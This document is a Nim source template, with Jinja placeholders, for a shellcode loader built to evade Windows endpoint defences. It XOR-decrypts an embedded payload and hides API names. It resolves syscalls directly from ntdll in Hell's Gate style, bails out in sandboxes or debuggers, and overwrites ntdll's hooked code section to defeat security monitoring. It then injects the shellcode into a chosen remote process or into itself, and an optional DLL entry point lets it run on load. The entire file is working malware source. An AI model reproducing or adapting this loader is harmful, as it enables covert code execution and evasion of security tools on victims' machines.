
import winim/lean
import os, strutils, dynlib, psutil
import std/algorithm

{.passC:"-masm=intel".}

# conf
const
  isRemote = {{ is_remote|lower }}
  targetProc = "{{ target_process }}"

proc xorString(key: byte, input: openarray[byte]): string =
  result = newString(input.len)
  for i in 0 ..< input.len:
    result[i] = chr(input[i] xor key)

# encryption
proc xorDecrypt(input: openarray[byte], key: openarray[byte]): seq[byte] =
  result = newSeq[byte](input.len)
  for i in 0 ..< input.len:
    result[i] = input[i] xor key[i mod key.len]

var encryptedPayload: array[{{ shellcode_len }}, byte] = [{{ payload_nim }}]
var key: array[{{ key_len }}, byte] = [{{ key_nim }}]

# xored strings
let t_ntdll = {{ s_ntdll }}
let t_kernel32 = {{ s_kernel32 }}
let t_NtAlloc = {{ s_NtAlloc }}
let t_NtProtect = {{ s_NtProtect }}
let t_NtWrite = {{ s_NtWrite }}
let t_NtOpen = {{ s_NtOpenProc }}
let t_NtCreate = {{ s_NtCreateThread }}

var STR_NTDLL = xorString(t_ntdll[0], t_ntdll[1])
var STR_KERNEL32 = xorString(t_kernel32[0], t_kernel32[1])
var STR_NTALLOC = xorString(t_NtAlloc[0], t_NtAlloc[1])
var STR_NTPROTECT = xorString(t_NtProtect[0], t_NtProtect[1])
var STR_NTWRITE = xorString(t_NtWrite[0], t_NtWrite[1])
var STR_NTOPEN = xorString(t_NtOpen[0], t_NtOpen[1])
var STR_NTCREATE = xorString(t_NtCreate[0], t_NtCreate[1])

# hells gate
var 
  wSSN_NtAlloc: WORD = 0
  pSyscall_NtAlloc: PVOID = nil
  wSSN_NtProtect: WORD = 0
  pSyscall_NtProtect: PVOID = nil
  wSSN_NtWrite: WORD = 0
  pSyscall_NtWrite: PVOID = nil
  wSSN_NtOpen: WORD = 0
  pSyscall_NtOpen: PVOID = nil
  wSSN_NtCreate: WORD = 0
  pSyscall_NtCreate: PVOID = nil

proc getSyscallStub(functionName: string): (WORD, PVOID) =
     var 
       hNtdll = GetModuleHandleA(STR_NTDLL)
       pDosHeader = cast[PIMAGE_DOS_HEADER](hNtdll)
       pNtHeaders = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](hNtdll) + pDosHeader.e_lfanew)
       pExportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[DWORD_PTR](hNtdll) + pNtHeaders.OptionalHeader.DataDirectory[0].VirtualAddress)
       names = cast[ptr UncheckedArray[DWORD]](cast[DWORD_PTR](hNtdll) + pExportDir.AddressOfNames)
       ordinals = cast[ptr UncheckedArray[WORD]](cast[DWORD_PTR](hNtdll) + pExportDir.AddressOfNameOrdinals)
       functions = cast[ptr UncheckedArray[DWORD]](cast[DWORD_PTR](hNtdll) + pExportDir.AddressOfFunctions)

     for i in 0 ..< pExportDir.NumberOfNames:
       var name = cast[cstring](cast[DWORD_PTR](hNtdll) + names[i])
       if $name == functionName:
         var funcAddr = cast[PVOID](cast[DWORD_PTR](hNtdll) + functions[ordinals[i]])
         var ptrByte = cast[ptr byte](funcAddr)
         
         # get ssn
         var ssn = cast[ptr WORD](cast[DWORD_PTR](ptrByte) + 4)[]
         
         # find syscall
         for j in 0..30:
           var b1 = cast[ptr byte](cast[DWORD_PTR](ptrByte) + j)[]
           var b2 = cast[ptr byte](cast[DWORD_PTR](ptrByte) + j + 1)[]
           if b1 == 0x0F and b2 == 0x05:
             var syscallAddr = cast[PVOID](cast[DWORD_PTR](ptrByte) + j)
             return (ssn, syscallAddr)
             
     return (0.WORD, nil)

proc ntAllocateVirtualMemorySyscall(ProcessHandle: HANDLE, BaseAddress: ptr PVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, %0 
        mov r11, %1
        jmp r11
        ret
    """ : wSSN_NtAlloc, pSyscall_NtAlloc

proc ntProtectVirtualMemorySyscall(ProcessHandle: HANDLE, BaseAddress: ptr PVOID, NumberOfBytesToProtect: PSIZE_T, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, %0
        mov r11, %1
        jmp r11
        ret
    """ : wSSN_NtProtect, pSyscall_NtProtect

proc ntWriteVirtualMemorySyscall(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, %0
        mov r11, %1
        jmp r11
        ret
    """ : wSSN_NtWrite, pSyscall_NtWrite

proc ntOpenProcessSyscall(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, %0
        mov r11, %1
        jmp r11
        ret
    """ : wSSN_NtOpen, pSyscall_NtOpen

proc ntCreateThreadExSyscall(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PVOID): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, %0
        mov r11, %1
        jmp r11
        ret
    """ : wSSN_NtCreate, pSyscall_NtCreate

# anti sandbox/debug
proc checkSandbox(): bool =
  # ram chk
  var mem: MEMORYSTATUSEX
  mem.dwLength = sizeof(mem).DWORD
  GlobalMemoryStatusEx(addr mem)
  if (mem.ullTotalPhys div 1024 div 1024) < 4096:
    return true

  # cpu chk
  var si: SYSTEM_INFO
  GetSystemInfo(addr si)
  if si.dwNumberOfProcessors < 2:
    return true

  # debug chk
  if IsDebuggerPresent():
    return true
    
  return false

# unhooking
proc unhookNtdll() =
  var 
    processH = GetCurrentProcess()
    mi: MODULEINFO
    ntdllModule = GetModuleHandleA(STR_NTDLL)
    ntdllBase: LPVOID
    ntdllFile: HANDLE
    ntdllMapping: HANDLE
    ntdllMappingAddress: LPVOID
    hookedDosHeader: PIMAGE_DOS_HEADER
    hookedNtHeader: PIMAGE_NT_HEADERS
  
  if ntdllModule == 0: return

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll

  ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)
  if ntdllFile == INVALID_HANDLE_VALUE: return

  ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL)
  if ntdllMapping == 0: 
    CloseHandle(ntdllFile)
    return

  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress == nil:
    CloseHandle(ntdllMapping)
    CloseHandle(ntdllFile)
    return

  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  
  for i in 0 ..< hookedNtHeader.FileHeader.NumberOfSections:
    var pSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](hookedNtHeader) + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)))
    var sectionName = cast[cstring](addr pSectionHeader.Name)
    
    if strutils.startsWith($sectionName, ".text"):
      var oldProtect: DWORD = 0
      var virtAddr = cast[LPVOID](cast[DWORD_PTR](ntdllBase) + pSectionHeader.VirtualAddress)
      var virtSize = pSectionHeader.Misc.VirtualSize
      
      VirtualProtect(virtAddr, virtSize, PAGE_EXECUTE_READWRITE, addr oldProtect)
      copyMem(virtAddr, cast[LPVOID](cast[DWORD_PTR](ntdllMappingAddress) + pSectionHeader.VirtualAddress), virtSize)
      VirtualProtect(virtAddr, virtSize, oldProtect, addr oldProtect)
      break

  UnmapViewOfFile(ntdllMappingAddress)
  CloseHandle(ntdllMapping)
  CloseHandle(ntdllFile)

# injection logic
proc runInjection() =
  var payload = xorDecrypt(encryptedPayload, key)
  var pSize = cast[SIZE_T](payload.len)
  var pAddr: PVOID = nil
  var status: NTSTATUS

  # init ssns
  var stub = getSyscallStub(STR_NTALLOC) 
  wSSN_NtAlloc = stub[0]; pSyscall_NtAlloc = stub[1]
  
  stub = getSyscallStub(STR_NTPROTECT)
  wSSN_NtProtect = stub[0]; pSyscall_NtProtect = stub[1]

  if isRemote:
    # remote injections
    stub = getSyscallStub(STR_NTOPEN)
    wSSN_NtOpen = stub[0]; pSyscall_NtOpen = stub[1]

    stub = getSyscallStub(STR_NTWRITE)
    wSSN_NtWrite = stub[0]; pSyscall_NtWrite = stub[1]

    stub = getSyscallStub(STR_NTCREATE)
    wSSN_NtCreate = stub[0]; pSyscall_NtCreate = stub[1]

    # find pid
    var pid: DWORD = 0
    var entry: PROCESSENTRY32
    entry.dwSize = sizeof(entry).DWORD
    var snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    
    if snapshot != INVALID_HANDLE_VALUE:
      if Process32First(snapshot, addr entry):
        while Process32Next(snapshot, addr entry):
          if $entry.szExeFile == targetProc:
            pid = entry.th32ProcessID
            break
      CloseHandle(snapshot)
    
    if pid == 0: return

    # ntopenprocess
    var hProcess: HANDLE
    var oa: OBJECT_ATTRIBUTES
    var cid: CLIENT_ID
    cid.UniqueProcess = cast[HANDLE](pid)
    cid.UniqueThread = 0
    
    status = ntOpenProcessSyscall(addr hProcess, PROCESS_ALL_ACCESS, addr oa, addr cid)
    if status != 0: return

    # rtalocatevirtualmemory
    var remoteAddr: PVOID = nil
    var regionSize: SIZE_T = pSize
    
    status = ntAllocateVirtualMemorySyscall(hProcess, addr remoteAddr, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if status != 0:
        CloseHandle(hProcess)
        return

    # ntwritevirtualmemory
    var bytesWritten: SIZE_T
    status = ntWriteVirtualMemorySyscall(hProcess, remoteAddr, addr payload[0], pSize, addr bytesWritten)
    if status != 0:
        CloseHandle(hProcess)
        return

    # ntprotectvirtualmemory rw rx
    var oldProt: ULONG = 0
    var protectSize: SIZE_T = pSize
    # Note: BaseAddress is a pointer to the PVOID, so we need addr remoteAddr
    status = ntProtectVirtualMemorySyscall(hProcess, addr remoteAddr, addr protectSize, PAGE_EXECUTE_READ, addr oldProt)
    
    # ntcreatetreadex
    var hThread: HANDLE
    status = ntCreateThreadExSyscall(addr hThread, GENERIC_ALL, NULL, hProcess, remoteAddr, NULL, 0, 0, 0, 0, NULL)
    
    if status == 0:
        WaitForSingleObject(hThread, INFINITE)
        CloseHandle(hThread)
        
    CloseHandle(hProcess)

  else:
    # self injection
    var regionSize: SIZE_T = pSize
    # alloc rw
    status = ntAllocateVirtualMemorySyscall(
        cast[HANDLE](-1), 
        addr pAddr, 
        0, 
        addr regionSize, 
        MEM_COMMIT or MEM_RESERVE, 
        PAGE_READWRITE
    )
    
    if status == 0:
        copyMem(pAddr, addr payload[0], pSize)
        
        # protect rx
        var oldProt: ULONG = 0
        var protectSize: SIZE_T = pSize
        status = ntProtectVirtualMemorySyscall(
          cast[HANDLE](-1),
          addr pAddr,
          addr protectSize,
          PAGE_EXECUTE_READ,
          addr oldProt
        )
        
        var hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](pAddr), NULL, 0, NULL)
        if hThread != 0:
          WaitForSingleObject(hThread, INFINITE)
          CloseHandle(hThread)

proc NimMain() {.cdecl, exportc.} =
  if checkSandbox(): return
  unhookNtdll()
  runInjection()

{% if is_dll %}
{% for fn in function_names %}
proc {{ fn }}() {.stdcall, exportc, dynlib.} =
  NimMain()
{% endfor %}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
  return true
{% else %}
when isMainModule:
  NimMain()
{% endif %}
